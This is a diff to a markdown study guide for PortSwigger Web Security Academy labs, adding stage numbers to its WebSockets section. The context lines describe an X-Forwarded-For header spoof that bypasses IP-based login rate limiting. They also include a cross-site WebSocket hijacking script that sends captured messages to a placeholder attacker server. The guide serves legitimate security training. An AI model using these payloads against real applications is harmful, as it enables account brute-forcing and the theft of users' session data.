@@ -1393,7 +1393,7 @@ Not present in the botesjuan reference repository (or not mappable to a single f
 - Step: 2
 
 
-## WebSockets
+## WebSockets — Typical stage: 1-2
 
 **How to recognize it (general):** open Burp Proxy > WebSockets history while using the app's feature; intercept/modify WS messages with Burp Proxy/Repeater; any classic HTTP vulnerability (XSS, SQLi, etc.) can also appear in WS messages, and the handshake itself (done via HTTP) can be vulnerable to CSRF if it relies only on cookies.
 
@@ -1403,6 +1403,7 @@ Not present in the botesjuan reference repository (or not mappable to a single f
 - Solution: clone/modify the WebSocket handshake in Burp Repeater (pencil icon near the WS URL) by adding or altering custom headers to exploit the flawed server-side logic (e.g. bypassing rate-limiting on a login endpoint exposed via WS).
 - Payload: add to the handshake a header like `X-Forwarded-For: 1.1.1.<random>` for each attempt, bypassing the IP-based block
 - Link: [Manipulating WebSocket messages to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities)
+- Step: 1
 
 **2. Cross-site WebSocket hijacking (CSWSH)**
 
@@ -1410,6 +1411,7 @@ Not present in the botesjuan reference repository (or not mappable to a single f
 - Solution: create a malicious HTML page hosted on your own domain that, on load, opens a cross-site WebSocket connection to the vulnerable app (the victim's browser will automatically send the session cookies); the page can then send messages to perform actions or intercept response messages containing sensitive data.
 - Payload: an HTML page with the script `<script>var ws = new WebSocket('wss://TARGET/chat'); ws.onmessage = function(event) { fetch('https://YOUR-SERVER/log?data=' + event.data); }; ws.onopen = function() { ws.send('READY'); };</script>`
 - Link: [Cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)
+- Step: 2
 
 
 ## Business logic vulnerabilities
